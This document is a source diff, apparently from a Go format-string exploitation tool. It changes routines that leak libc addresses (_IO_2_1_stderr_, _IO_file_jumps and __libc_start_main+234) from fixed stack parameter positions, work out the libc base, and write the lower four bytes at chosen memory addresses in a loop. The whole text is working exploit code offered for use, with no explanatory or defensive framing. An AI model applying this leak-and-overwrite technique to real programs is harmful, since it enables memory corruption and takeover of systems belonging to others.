@@ -66,15 +66,20 @@ func leakParams(proc *process.Process) {
 	log.Printf("press enter when ready")
 	fmt.Scanln()
 
-	// _IO_2_1_stderr_       - 0x7fefcc8be5c0 - 21
-	// __libc_start_main+234 - 0x7fefcc725d0a - 45
-	// _IO_file_jumps        - 0x7fefcc8bf4a0 - 28
-	_IO_2_1_stderr_ := leaker.MemoryAtParamOrExit(21)
-	__libc_start_main234 := leaker.MemoryAtParamOrExit(45)
-	_IO_file_jumps := leaker.MemoryAtParamOrExit(28)
+	pm := memory.PointerMakerForX68_64()
 
-	log.Printf("_IO_2_1_stderr_: %s | __libc_start_main+234: %s | _IO_file_jumps %s",
-		_IO_2_1_stderr_, __libc_start_main234, _IO_file_jumps)
+	// _IO_2_1_stderr_      - 0x7f7997d8e5c0 - 21
+	// _IO_file_jumps       - 0x7f7997d8f4a0 - 28
+	//__libc_start_main+234 - 0x7fa0bed99d0a - 45
+	_IO_2_1_stderr_ := leaker.MemoryAtParamOrExit(21)
+	_IO_file_jumps := leaker.MemoryAtParamOrExit(28)
+	__libc_start_main234 := pm.HexBytesOrExit(leaker.MemoryAtParamOrExit(45), binary.BigEndian)
+
+	log.Printf("_IO_2_1_stderr_: %s | _IO_file_jumps %s | __libc_start_main 0x%x",
+		_IO_2_1_stderr_, _IO_file_jumps, __libc_start_main234.Uint()-234)
+
+	log.Printf("press enter when done")
+	fmt.Scanln()
 }
 
 func leakLocalLibcSymbolParamNumbers(proc *process.Process) {
@@ -159,7 +164,7 @@ func writeMemoryLoop(proc *process.Process) {
 	})
 
 	if verbose != nil {
-		str, err := writer.Lower32BitsFormatString(10)
+		str, err := writer.Lower4BytesFormatString(10)
 		if err != nil {
 			log.Fatalf("failed to get format string for verbose log - %s", err)
 		}
@@ -195,7 +200,7 @@ func writeMemoryLoop(proc *process.Process) {
 			continue
 		}
 
-		writer.OverwriteLower32BitsAtOrExit(num, pointer)
+		writer.WriteLower4BytesAtOrExit(num, pointer)
 
 		log.Printf("wrote %d to %s", num, pointer.HexString())
 	}
